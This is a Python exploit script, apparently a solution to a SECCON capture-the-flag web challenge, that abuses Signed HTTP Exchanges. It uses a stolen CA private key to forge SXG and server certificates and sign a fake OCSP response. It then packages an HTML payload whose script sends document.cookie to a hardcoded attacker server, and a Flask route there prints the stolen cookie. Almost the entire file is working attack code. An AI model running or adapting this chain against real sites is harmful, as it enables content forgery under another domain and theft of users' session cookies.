import threading
import time
import socket
import struct
import requests
from flask import Flask, request, send_file, Response
import logging
import os
from cryptography import x509
from cryptography.x509.oid import NameOID, ExtensionOID
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization
import datetime
import base64
import ipaddress

# Configuration
PORT = 1337 # Must match the bot's port for rebind to work
ATTACKER_IP = "68.221.172.111" # Your VPS IP
ATTACKER_DOMAIN = f"{ATTACKER_IP}.nip.io" # Use nip.io to avoid IP cert issues

# --- Stage 2 App (SXG Server) ---
stage2_app = Flask("stage2")
stage2_log = logging.getLogger('werkzeug')
stage2_log.setLevel(logging.ERROR)

@stage2_app.route('/exploit.sxg')
def serve_sxg():
    try:
        # Note: The mimetype must be exactly this for the browser to process it as an SXG
        resp = send_file("exploit.sxg", mimetype="application/signed-exchange;v=b3")
        resp.headers["X-Content-Type-Options"] = "nosniff"
        # Add CORS headers just in case
        resp.headers["Access-Control-Allow-Origin"] = "*"
        return resp
    except FileNotFoundError:
        return "SXG not generated yet. Please run the generation commands.", 404

@stage2_app.route('/cert.cbor')
def serve_cert_cbor():
    try:
        return send_file("cert.cbor", mimetype="application/cert-chain+cbor")
    except FileNotFoundError:
        return "Cert CBOR not generated yet.", 404

@stage2_app.route('/resource.validity.msg')
def serve_validity():
    return "dummy", 200

@stage2_app.route('/flag')
def get_flag():
    cookie = request.args.get('cookie')
    print(f"\n[!!!] FLAG: {cookie}\n")
    resp = Response("OK")
    resp.headers["Access-Control-Allow-Origin"] = "*"
    return resp

def run_stage2_server():
    print(f"[+] Restarting Server on port {PORT} for Stage 2 (SXG)...")
    # Use SSL context for HTTPS
    stage2_app.run(host="0.0.0.0", port=PORT, ssl_context=('server.crt', 'server.key'))

# --- Step 2: Generate SXG ---

def step2_generate_sxg():
    print("[+] Generating Certificate and SXG...")
    
    try:
        # 1. Load the stolen key (CA key)
        with open("stolen_cert.key", "rb") as f:
            ca_key = serialization.load_pem_private_key(f.read(), password=None)
        
        # 2. Load the CA cert
        with open("bot/cert.crt", "rb") as f:
            ca_cert = x509.load_pem_x509_certificate(f.read())
        
        # 3. Generate a new key for the SXG cert
        sxg_key = ec.generate_private_key(ec.SECP256R1())
        
        # 4. Create the SXG certificate
        subject = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, u"hack.the.planet.seccon"),
        ])
        
        builder = x509.CertificateBuilder()
        builder = builder.subject_name(subject)
        builder = builder.issuer_name(ca_cert.subject)
        builder = builder.public_key(sxg_key.public_key())
        builder = builder.serial_number(x509.random_serial_number())
        # Set not_valid_before to 1 day in the past to handle clock skew
        builder = builder.not_valid_before(datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(days=1))
        builder = builder.not_valid_after(datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=7))
        
        # Add SAN for the SXG certificate (Required by Chrome)
        builder = builder.add_extension(
            x509.SubjectAlternativeName([
                x509.DNSName(u"hack.the.planet.seccon")
            ]),
            critical=False
        )

        builder = builder.add_extension(
            x509.UnrecognizedExtension(
                x509.ObjectIdentifier("1.3.6.1.4.1.11129.2.1.22"),
                b"\x05\x00"
            ),
            critical=False
        )

        # Add Key Usage (Required for SXG)
        builder = builder.add_extension(
            x509.KeyUsage(
                digital_signature=True,
                content_commitment=False,
                key_encipherment=False,
                data_encipherment=False,
                key_agreement=False,
                key_cert_sign=False,
                crl_sign=False,
                encipher_only=False,
                decipher_only=False,
            ),
            critical=True,
        )
        
        sxg_cert = builder.sign(
            private_key=ca_key, algorithm=hashes.SHA256()
        )
        
        with open("sxg.key", "wb") as f:
            f.write(sxg_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            ))
            
        with open("sxg.crt", "wb") as f:
            f.write(sxg_cert.public_bytes(serialization.Encoding.PEM))
            
        print("[+] Certificate generated.")
        
        # Create payload
        # Note: We must use HTTPS for the callback because our server is now HTTPS.
        payload_html = """
        <!DOCTYPE html>
        <html>
        <body>
        <h1>Pwned</h1>
        <script>
            fetch("https://""" + ATTACKER_DOMAIN + ":" + str(PORT) + """/flag?cookie=" + document.cookie).catch(e => console.log(e));
        </script>
        </body>
        </html>
        """
        with open("payload.html", "w") as f:
            f.write(payload_html)
            
        with open("resource.validity.msg", "wb") as f:
            f.write(b"dummy")

        # Create chain.pem for gen-certurl
        with open("chain.pem", "wb") as f:
            with open("sxg.crt", "rb") as cert_f:
                f.write(cert_f.read())
            f.write(b"\n")
            with open("bot/cert.crt", "rb") as ca_f:
                f.write(ca_f.read())

        print("="*50)
        
        # Execute the commands automatically if the tools are installed
        try:
            print("[+] Attempting to generate SXG automatically...")
            
            # --- Generate OCSP Response ---
            print("[+] Generating OCSP response...")
            # 1. Create a dummy index.txt for OpenSSL
            # Format: V <expiry> <revocation> <serial> <filename> <subject>
            # We just need it to exist and contain the serial of our cert?
            # Actually, 'openssl ocsp' can sign a response without a DB if we use -ndiff? No.
            # Let's try to use the 'openssl ocsp' command to generate a response for the cert.
            
            # We need the serial number of sxg.crt.
            sxg_cert_serial = sxg_cert.serial_number
            sxg_cert_serial_hex = format(sxg_cert_serial, 'X')
            if len(sxg_cert_serial_hex) % 2 != 0:
                sxg_cert_serial_hex = "0" + sxg_cert_serial_hex
            
            with open("index.txt", "w") as f:
                # V <expiry> <revocation> <serial> unknown <subject>
                # Expiry: 251231235959Z (Year 2025)
                f.write(f"V\t251231235959Z\t\t{sxg_cert_serial_hex}\tunknown\t/CN=hack.the.planet.seccon\n")
            
            # 2. Create OCSP Request
            os.system("openssl ocsp -issuer bot/cert.crt -cert sxg.crt -reqout ocsp.req -no_nonce")
            
            # 3. Generate OCSP Response
            # We use the CA key to sign the OCSP response (since it's the issuer)
            cmd = f"openssl ocsp -index index.txt -rsigner bot/cert.crt -rkey stolen_cert.key -CA bot/cert.crt -reqin ocsp.req -respout ocsp.der -ndays 7"
            os.system(cmd)
            
            if not os.path.exists("ocsp.der"):
                print("[-] Failed to generate OCSP response.")
            else:
                print("[+] OCSP response generated.")

            # 1. Generate cert.cbor using chain.pem AND ocsp.der
            # Note: gen-certurl expects the full chain in the PEM file
            os.system(f"/home/stt/go/bin/gen-certurl -pem chain.pem -ocsp ocsp.der > cert.cbor")
            
            # 2. Create data URI for cert-url (required to avoid http scheme error)
            if os.path.exists("cert.cbor"):
                with open("cert.cbor", "rb") as f:
                    cbor_data = f.read()
                cert_url = "data:application/cert-chain+cbor;base64," + base64.b64encode(cbor_data).decode()
                print(f"[+] Created data URI for cert-url")
            else:
                print("[-] Failed to generate cert.cbor")
                return

            # 3. Generate SXG
            # We use the data URI for certUrl. 
            # For validityUrl, Chrome requires HTTPS and Same-Origin.
            # However, it does NOT fetch it immediately if the signature is fresh.
            # So we can point it to a non-existent URL on the target domain.
            
            validity_url = "https://hack.the.planet.seccon/resource.validity.msg"
            
            # Calculate date 5 minutes ago for clock skew
            past_date = (datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(minutes=5)).strftime('%Y-%m-%dT%H:%M:%SZ')

            # We still use -ignoreErrors because gen-signedexchange might try to fetch/verify it.
            cmd = f"/home/stt/go/bin/gen-signedexchange -ignoreErrors -uri https://hack.the.planet.seccon/ -content payload.html -certificate chain.pem -privateKey sxg.key -certUrl \"{cert_url}\" -validityUrl \"{validity_url}\" -date {past_date} -expire 72h -o exploit.sxg"
            os.system(cmd)
            
            if os.path.exists("exploit.sxg"):
                print("[+] SXG generated successfully.")
            else:
                print("[-] SXG generation failed (file not found).")
                
        except Exception as e:
            print(f"[-] Failed to run SXG tools: {e}")
            print("[-] Please run the commands manually.")
        
        # Start Stage 2 Server
        print(f"[+] Starting Stage 2 Server on port {PORT} (HTTPS)...")
        print(f"[+] 1. Point the bot to: https://{ATTACKER_DOMAIN}:{PORT}/exploit.sxg")
        print(f"[+]    OR try IP directly: https://{ATTACKER_IP}:{PORT}/exploit.sxg")
        
        # Generate server cert for HTTPS
        print("[+] Generating server certificate for HTTPS...")
        server_key = ec.generate_private_key(ec.SECP256R1())
        
        # Subject must match our Domain
        # Note: Chrome ignores CN, but we set it anyway.
        subject = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, u"{}".format(ATTACKER_DOMAIN)),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"Exploit Server"),
        ])
        
        builder = x509.CertificateBuilder()
        builder = builder.subject_name(subject)
        builder = builder.issuer_name(ca_cert.subject)
        builder = builder.public_key(server_key.public_key())
        builder = builder.serial_number(x509.random_serial_number())
        # Set not_valid_before to 1 day in the past
        builder = builder.not_valid_before(datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(days=1))
        builder = builder.not_valid_after(datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=7))
        
        # Add SAN for Domain and IP
        # Note: We make it critical=False to avoid issues if the browser doesn't understand it (unlikely)
        # But for Chrome, SAN is mandatory.
        builder = builder.add_extension(
            x509.SubjectAlternativeName([
                x509.DNSName(u"{}".format(ATTACKER_DOMAIN)),
                x509.IPAddress(ipaddress.ip_address(ATTACKER_IP))
            ]),
            critical=False
        )
        
        # Add Basic Constraints (CA:FALSE)
        builder = builder.add_extension(
            x509.BasicConstraints(ca=False, path_length=None), critical=True,
        )
        
        # Add Key Usage
        builder = builder.add_extension(
            x509.KeyUsage(
                digital_signature=True,
                content_commitment=False,
                key_encipherment=True,
                data_encipherment=False,
                key_agreement=False,
                key_cert_sign=False,
                crl_sign=False,
                encipher_only=False,
                decipher_only=False,
            ),
            critical=True,
        )
        
        # Add Extended Key Usage (Server Auth)
        builder = builder.add_extension(
            x509.ExtendedKeyUsage([x509.oid.ExtendedKeyUsageOID.SERVER_AUTH]),
            critical=False,
        )
        
        server_cert = builder.sign(
            private_key=ca_key, algorithm=hashes.SHA256()
        )
        
        with open("server.key", "wb") as f:
            f.write(server_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            ))
            
        with open("server.crt", "wb") as f:
            f.write(server_cert.public_bytes(serialization.Encoding.PEM))
            
        run_stage2_server()

    except Exception as e:
        print(f"[-] Error in Stage 2 generation: {e}")

if __name__ == "__main__":
    # Skip Step 1 (Exfiltration) since we have the key
    print("[+] Key already obtained. Proceeding to Step 2 (SXG Generation)...")
    
    # Run Step 2 directly
    step2_generate_sxg()